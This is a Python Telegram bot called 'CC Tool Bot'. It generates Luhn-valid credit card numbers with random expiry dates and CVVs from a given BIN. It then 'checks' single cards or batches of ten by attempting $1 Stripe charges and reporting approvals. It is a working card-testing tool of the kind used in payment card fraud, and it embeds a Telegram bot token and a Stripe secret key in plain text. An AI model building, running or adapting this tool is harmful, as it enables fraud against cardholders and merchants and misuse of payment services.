import random
import requests
import telebot
import time
import re
import stripe

# === Your keys ===
BOT_TOKEN = "7928470785:AAHMz54GOWoI-NsbD2zyj0Av_VbnqX7fYzI"
STRIPE_SECRET_KEY = "sk_test_51RPHEyPKJT4UzOPvvRdP59qoEt4h3khaN3xlGusDd1jvT01Houk9VsaH4geyzzWSBICupYkn5kuwEjTA2C3woy8N00Iph2LvSG"

bot = telebot.TeleBot(BOT_TOKEN)
stripe.api_key = STRIPE_SECRET_KEY

# ========== Helper Functions ==========

def is_valid_bin(bin_number):
    return bin_number.isdigit() and len(bin_number) >= 6

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def generate_card(bin_prefix, length=16):
    card_number = bin_prefix
    while len(card_number) < length - 1:
        card_number += str(random.randint(0, 9))
    digits = [int(d) for d in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    check_digit = (10 - (total % 10)) % 10
    return card_number + str(check_digit)

def generate_card_details():
    month = str(random.randint(1, 12)).zfill(2)
    current_year = int(time.strftime("%y"))
    year = str(random.randint(current_year + 1, current_year + 5))
    cvv = str(random.randint(100, 999))
    return month, year, cvv

def extract_card_info(text):
    match = re.search(r"(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})", text)
    return match.groups() if match else None

def extract_multiple_cards(text):
    lines = text.strip().splitlines()[1:]
    cards = []
    for line in lines:
        match = re.match(r"(\d{16})\|(\d{2})\|(\d{4})\|(\d{3,4})", line)
        if match:
            cards.append(match.groups())
    return cards

def check_card(number, exp_month, exp_year, cvc, username="Unknown"):
    bin_info = get_bin_info(number[:6])
    card_type = bin_info.get("scheme", "Unknown").title() if bin_info else "Unknown"
    brand = bin_info.get("brand", "") if bin_info else ""
    country = bin_info.get("country", {}).get("name", "Unknown") if bin_info else "Unknown"

    try:
        # Fix 2-digit year to 4-digit year
        exp_year = int(exp_year)
        if exp_year < 100:
            exp_year += 2000

        # Create PaymentMethod with billing details
        payment_method = stripe.PaymentMethod.create(
            type="card",
            card={
                "number": number,
                "exp_month": int(exp_month),
                "exp_year": exp_year,
                "cvc": cvc,
            },
            billing_details={
                "name": "Test User",
                "address": {
                    "line1": "123 Test St",
                    "city": "Test City",
                    "state": "CA",
                    "postal_code": "90001",
                    "country": "US",
                }
            }
        )

        # Create PaymentIntent with automatic payment methods enabled, no redirects
        payment_intent = stripe.PaymentIntent.create(
            amount=100,  # $1.00 in cents
            currency='usd',
            payment_method=payment_method.id,
            confirm=True,
            off_session=True,
            automatic_payment_methods={
                "enabled": True,
                "allow_redirects": "never"
            }
        )

        status = "✅ Approved"

    except stripe.error.CardError as e:
        err = e.error
        status = f"❌ Declined: {err.code} - {err.message}"
    except Exception as e:
        status = f"⚠️ Error: {str(e)}"

    return (
        f"📝 Status: {status}\n"
        f"💳 Card: {number}|{exp_month}|{exp_year}|{cvc}\n"
        f"🏷️ Type: {card_type} {brand}\n"
        f"🌍 Country: {country}\n"
        f"🔎 Checked by: {username}\n"
        f"{'-'*30}"
    )

# ========== Bot Handlers ==========

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    text = (
        "👋 Welcome to CC Tool Bot!\n\n"
        "🧾 Commands:\n"
        "🔹 /gen BIN - Generate 15 CCs\n"
        "🔹 /chk CC|MM|YY|CVV - Check single card\n"
        "🔹 /mass (then 10 cards) - Check multiple cards\n"
    )
    bot.reply_to(message, text)

@bot.message_handler(func=lambda msg: msg.text.startswith(('/gen', '.gen')))
def generate_cards(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide BIN. Example: /gen 446542")
        return

    bin_number = parts[1]
    if not is_valid_bin(bin_number):
        bot.reply_to(message, "⚠️ Invalid BIN.")
        return

    bin_info = get_bin_info(bin_number)
    if not bin_info:
        bin_text = "⚠️ BIN not found."
    else:
        bin_text = (
            f"🏦 BIN Info:\n"
            f"• Brand: {bin_info.get('scheme', 'Unknown').title()}\n"
            f"• Type: {bin_info.get('type', 'Unknown').title()}\n"
            f"• Bank: {bin_info.get('bank', {}).get('name', 'Unknown')}\n"
            f"• Country: {bin_info.get('country', {}).get('name', 'Unknown')} {bin_info.get('country', {}).get('emoji', '')}\n"
        )

    cards = []
    for _ in range(15):
        number = generate_card(bin_number)
        month, year, cvv = generate_card_details()
        cards.append(f"{number}|{month}|{year}|{cvv}")

    msg = f"📦 CC GENERATOR\n• Format: {bin_number}|xx|xx|xxx\n\n{bin_text}\n🧾 Generated Cards:\n" + "\n".join(cards)
    bot.reply_to(message, msg)

@bot.message_handler(func=lambda msg: msg.text.startswith('/chk'))
def single_check(message):
    data = extract_card_info(message.text)
    if not data:
        bot.reply_to(message, "❗ Please provide CC|MM|YY|CVV after /chk.")
        return

    bot.reply_to(message, "⏳ Checking...")
    result = check_card(*data, username=message.from_user.username or "Unknown")
    bot.reply_to(message, result)

@bot.message_handler(func=lambda msg: msg.text.startswith('/mass'))
def mass_check(message):
    cards = extract_multiple_cards(message.text)
    if not cards:
        bot.reply_to(message, "❗ Please provide up to 10 cards in format:\nCC|MM|YYYY|CVV")
        return

    if len(cards) > 10:
        bot.reply_to(message, "⚠️ Only 10 cards allowed at once.")
        return

    for i, card in enumerate(cards, 1):
        bot.send_message(message.chat.id, f"🔍 Card {i}: Checking...")
        result = check_card(*card, username=message.from_user.username or "Unknown")
        bot.send_message(message.chat.id, f"Card {i}:\n{result}")
        # Speed up batch checking
        time.sleep(0.5)

# ========== Start Bot ==========
bot.polling()
